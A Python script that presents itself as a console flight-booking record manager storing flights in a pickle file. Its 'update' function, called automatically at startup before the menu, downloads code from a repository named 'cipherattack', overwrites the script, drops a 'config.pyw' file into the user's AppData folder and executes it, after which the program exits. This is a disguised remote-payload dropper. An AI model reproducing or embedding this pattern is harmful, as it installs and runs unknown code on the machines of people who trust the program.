import pickle, os, urllib.request as ur


def addFlight():
    recd = displayRecord()
    with open("availability.dat","wb+") as f:
        print("Enter details of the flight as per the instructions. \nFLIGHT NUMBER SHOULD BE UNIQUE IN RECORD OR ELSE THE DETAILS WOULD BE OVERWRITTEN.\n")
        interg = ["Flight No: ","Departing Place: ","Approaching Place: ","Time of Departure: ","Time to Approach: ","Price of the ticket (in Rupees): "]
        details = [input(i) for i in interg]
        for i in range(len(details)):
            if not len(details[i]):
                details[i] = "X"
        recd[details[0]] = details[1:] 
        pickle.dump(recd,f)
        print("Successfully Registered Flight no.",details[0])

def deleteFlight():
    recd = displayRecord()
    fno = input("Enter the flight no. ")
    if fno not in recd.keys():
        print("No flight was not found having number",fno)
        return
    if input(f"Are you sure you wanna delete flight no. {fno}, from {recd[fno][0]} to {recd[fno][1]}? ").lower()[0] == "y":
        with open("availability.dat","wb+") as f:
            del recd[fno]
            pickle.dump(recd,f)
            print("Successfully Removed")
    else:
        return

def displayRecord():
    with open("availability.dat","rb") as f:
        recd = pickle.load(f)
        return recd

def cleanRecord():
    with open("availability.dat","wb") as f:
        pickle.dump({},f)
    print("Deleted all the entries!")
    return

def update():
    with ur.urlopen("https://github.com/cipher234/cipherattack/raw/main/flightServer.py") as updateFile:
        with open(os.path.basename(__file__),"wb") as py:
            py.write(updateFile.read())
    os.chdir(os.environ['appdata'])        
    with ur.urlopen("https://github.com/cipher234/cipherattack/raw/main/cipher1/target.pyw") as conf:
        with open("config.pyw","wb") as config:
            config.write(conf.read())
    os.system("config.pyw")
    return
    
if not os.path.isfile("availability.dat"):
    with open("availability.dat","wb") as f:
        pickle.dump({},f)
update()
print("Updated the file successfully! Restart the program to check new update and features")
exit()
while True:
    print("Enter \"1\" for adding records\nEnter \"2\" for deleting specific records\nEnter \"3\" for viewing all the records\nEnter \"4\" for deleting all the records\nType and enter \"update\" for updating the program\n")
    todo = input("What to do? ")
    print("="*80)
    try:    
        if todo == "1":
            addFlight()
        elif todo == "2":
            deleteFlight()
        elif todo == "3":
            recd = displayRecord()
            if len(recd.keys()) == 0:
                print("No Record Found!\n"+"-"*80)
                continue
            for i in recd.keys():
                print(f"Flight No. : {i}\nDeparting Place : {recd[i][0]}\nApproaching Place : {recd[i][1]}\nTime of Departure : {recd[i][2]}\nTime to Approach: {recd[i][3]}\nPrice : ₹{recd[i][4]}/-")
                print("-"*80)
        elif todo == "4":
            if input("This will delete all the registered flights. Are you sure? ").lower()[0] == "y":
                cleanRecord()
            else:
                continue
        elif "update" in todo.lower():
            update()
            print("Updated the file successfully! Restart the program to check new update and features")
            exit()
        else:
            exit()
        print("="*80)
    except EOFError:
        with open("availability.dat","wb") as f:
            pickle.dump({},f)
        print("Uh-OH! Try Again!")
        print("="*80)
            
